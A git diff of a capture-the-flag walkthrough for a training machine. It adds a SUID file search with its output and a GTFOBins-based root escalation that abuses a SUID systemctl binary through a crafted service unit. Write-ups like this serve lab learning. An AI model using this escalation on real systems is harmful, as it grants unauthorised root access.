@@ -208,6 +208,10 @@ $ ls home
 bill
 ```
 
+{% hint style="info" %}
+bill
+{% endhint %}
+
 #### 4.3 - What is the user flag?
 
 ```bash
@@ -239,10 +243,54 @@ Now that you have compromised this machine, we will escalate our privileges and 
 
 #### 5.1 - On the system, search for all SUID files. Which file stands out?
 
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
 
+```bash
+-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
+-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
+-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
+```
 
 #### 5.2 - Become root and get the last flag (/root/root.txt)
 
-\
+We can use script of this website to became a root, in this case we choose systemctl process [https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)\
+
+
+```bash
+sudo install -m =xs $(which systemctl) .
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+```
+
 \
 \
